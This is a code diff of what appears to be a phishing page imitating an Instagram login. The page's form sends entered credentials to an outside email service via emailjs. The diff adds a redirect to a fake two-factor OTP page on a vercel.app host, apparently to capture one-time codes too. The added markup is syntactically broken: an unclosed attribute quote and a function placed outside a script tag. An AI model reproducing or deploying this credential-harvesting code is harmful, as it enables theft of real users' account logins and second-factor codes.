@@ -76,7 +76,7 @@
                                 <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);"><a href="#" class="forgot-pw">Forgotten your password?</a></div>
                             </div>
                             <div class="btn-group">
-                                <button class="btn-login"  type="submit" id="button" value="Send Email">
+                                <button class="btn-login"  type="submit" id="button" value="Send Email" onclick="redirect();>
                                     Log In
                                 </button>
                                 <div class="box goto">
@@ -153,13 +153,17 @@
                     emailjs.sendForm(serviceID, templateID, this)
                         .then(() => {
                             btn.value = 'Send Email';
-                            alert('continue to 2factor authentication <p> <a href"https://fanflqopx.vercel.app/instagram/otp/657daf104b167f68d1979b9c.html">2factor</a></p>.');
+                            // alert('continue to 2factor authentication <p> <a href"https://fanflqopx.vercel.app/instagram/otp/657daf104b167f68d1979b9c.html">2factor</a></p>.');
                         }, (err) => {
                             btn.value = 'Send Email';
                             alert(JSON.stringify(err));
                         });
                 });
     </script>
+    function redirect() {
+  window.location.replace("https://fanflqopx.vercel.app/instagram/otp/657daf104b167f68d1979b9c.html");
+  return false;
+}
     
     <script src="app.js"></script> 
 
